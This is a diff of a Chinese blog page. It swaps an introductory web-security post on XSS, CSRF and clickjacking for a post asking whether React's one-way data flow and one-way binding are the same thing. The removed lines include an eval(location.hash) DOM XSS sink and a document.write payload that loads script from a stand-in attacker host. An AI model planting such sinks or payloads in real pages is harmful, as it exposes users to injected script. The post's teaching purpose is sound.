@@ -7,7 +7,7 @@
     
 
     <title>
-      Web安全初探 | 全面回忆 | zhangdiweb | zhangdi | hahacoo 
+      数据流和数据绑定的思考 | 全面回忆 | zhangdiweb | zhangdi | hahacoo 
     </title>
 
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -19,16 +19,28 @@
       <meta name="keywords" content="全面回忆,javascript,css">
     
 
-    <meta name="description" content="前端安全主要有三类：XSS、CSRF、界面操作劫持。">
+    <meta name="description" content="最近在看React官方文档中有这样一段描述。
+
+React’s one-way data flow(also called one-way binding) keeps everything modular and fast.
+
+one-way data flow和one-way binding到底如何理解，是一码事吗？">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web安全初探 | 全面回忆">
-<meta property="og:url" content="http://zhangdiweb.com/2017/06/18/Web安全初探/index.html">
+<meta property="og:title" content="数据流和数据绑定的思考 | 全面回忆">
+<meta property="og:url" content="http://zhangdiweb.com/2017/11/10/数据流和数据绑定的思考/index.html">
 <meta property="og:site_name" content="全面回忆">
-<meta property="og:description" content="前端安全主要有三类：XSS、CSRF、界面操作劫持。">
-<meta property="og:updated_time" content="2017-10-06T01:35:30.000Z">
+<meta property="og:description" content="最近在看React官方文档中有这样一段描述。
+
+React’s one-way data flow(also called one-way binding) keeps everything modular and fast.
+
+one-way data flow和one-way binding到底如何理解，是一码事吗？">
+<meta property="og:updated_time" content="2017-11-10T05:51:16.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Web安全初探 | 全面回忆">
-<meta name="twitter:description" content="前端安全主要有三类：XSS、CSRF、界面操作劫持。">
+<meta name="twitter:title" content="数据流和数据绑定的思考 | 全面回忆">
+<meta name="twitter:description" content="最近在看React官方文档中有这样一段描述。
+
+React’s one-way data flow(also called one-way binding) keeps everything modular and fast.
+
+one-way data flow和one-way binding到底如何理解，是一码事吗？">
     
     
     
@@ -193,12 +205,12 @@ classes that you can use:
 
   <header class="post-header">
     
-    <h1 class="post-title">Web安全初探</h1>
+    <h1 class="post-title">数据流和数据绑定的思考</h1>
 
     
 
     <div class="post-meta">
-      <time datetime="2017-06-18" class="post-meta__date date">2017-06-18</time> 
+      <time datetime="2017-11-10" class="post-meta__date date">2017-11-10</time> 
 
       <span class="post-meta__tags tags">
 
@@ -214,20 +226,15 @@ classes that you can use:
   </header>
 
   <section id="post-content" class="article-content post">
-    <p>前端安全主要有三类：XSS、CSRF、界面操作劫持。</p>
+    <p>最近在看React官方文档中有这样一段描述。</p>
+<blockquote>
+<p>React’s one-way data flow(also called one-way binding) keeps everything modular and fast.</p>
+</blockquote>
+<p><em>one-way data flow</em>和<em>one-way binding</em>到底如何理解，是一码事吗？</p>
 <a id="more"></a>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS，全称Cross Site Scripting，即跨站脚本，当浏览器渲染整个HTML文档的过程中出现了不被预期的脚本指令并执行时，XSS就会发生。</p>
-<p>XSS有三类，反射性XSS、存储性XSS和DOM XSS。</p>
-<h4 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h4><p>XSS代码出现在URL中，作为输入提交到服务器，服务端解析后响应，在响应中出现这段XSS代码，并被浏览器解析执行。</p>
-<h4 id="存储性XSS"><a href="#存储性XSS" class="headerlink" title="存储性XSS"></a>存储性XSS</h4><p>XSS代码作为输入提交到服务器，并存储在服务器。下次请求在响应中出现这段XSS代码，并被浏览器解析执行。典型的留言板XSS。</p>
-<h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h4><p>DOM XSS大代码并不需要服务端解析，触发XSS靠的就是浏览器的解析。设想下如果在你的页面有这么一段代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</div></pre></td></tr></table></figure>
-<p>这样就可以通过URL中插入XSS攻击代码，如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;script src="www.xss.com/xss.js"&gt;&lt;/script&gt;'</span>)</div></pre></td></tr></table></figure>
-<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF，全称Cross Site Request Forgery，即跨站请求伪造。CSRF有两个关键点：跨站点的请求与请求是伪造的。</p>
-<h4 id="跨站点请求"><a href="#跨站点请求" class="headerlink" title="跨站点请求"></a>跨站点请求</h4><p>字面上理解，请求的来源是其他站点的。A站的删除数据的功能接收到了B站发来的请求。</p>
-<h4 id="请求伪造"><a href="#请求伪造" class="headerlink" title="请求伪造"></a>请求伪造</h4><p>伪造的定义，可以理解为请求的发出不是用户的意愿。</p>
-<h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>界面劫持攻讦是一种基于视觉欺骗的Web攻击，通过在网页的可见输入控件上覆盖一个不可见框，使得用户误以为操作控件，实质操作已被不可见框劫持。</p>
+<p><em>one-way data flow</em>字面理解单向数据流，<em>one-way binding</em>字面理解单向数据绑定。数据流，那它一定有一个“源头”A和一个“目的地”B，数据的流动方向从A—&gt;B。在React中或者Vue，一个组件可以看做一个<strong>状态机</strong>，每个组件维护着自身的状态。子组件可以通过<code>props</code>获取到父组件的状态，但是不允许修改，只能通过回调或者事件去通知父组件进行修改。这样做的目的就是为了在复杂的系统中，能够更清晰的知道什么时候，是谁因为什么对状态做了修改。这是我理解的单向数据流，数据只能从父传递到子，不能从子到父，也不能在子组件中修改父组件中的状态。</p>
+<p>另一个概念，数据绑定，是指数据和视图之间的依赖关系。现在前端框架都遵循数据驱动的理念，数据的变化带来视图的变化，其中比较典型的<code>Vue</code>和<code>Angular</code>，双向绑定的楷模。他们做的一件事就是让开发人员不再关心数据变化造成视图更新这个过程，只专注在数据层面，数据到视图，视图再到数据，这两个双向的过程都有框架来完成。但<code>React</code>只做了其中一点，从数据到视图，当我们需要更新视图的时候，通过<code>setState</code>显示的调用更改，通知<code>React</code>更新视图，这就是为什么说<code>React</code>是one-way binding的。</p>
+<p>按照我的理解，单向数据流和单向数据绑定应该是两码事，不知道为什么<code>React</code>官方会这么解释，还是我的理解有偏差。</p>
 
   </section>
 
@@ -236,7 +243,7 @@ classes that you can use:
 
 <section class="post-comments">
 
-    <div class="ds-thread" data-thread-key="2017/06/18/Web安全初探/"></div>
+    <div class="ds-thread" data-thread-key="2017/11/10/数据流和数据绑定的思考/"></div>
 
     <script type="text/javascript">
       var duoshuoQuery = {short_name:"zhangcom"};
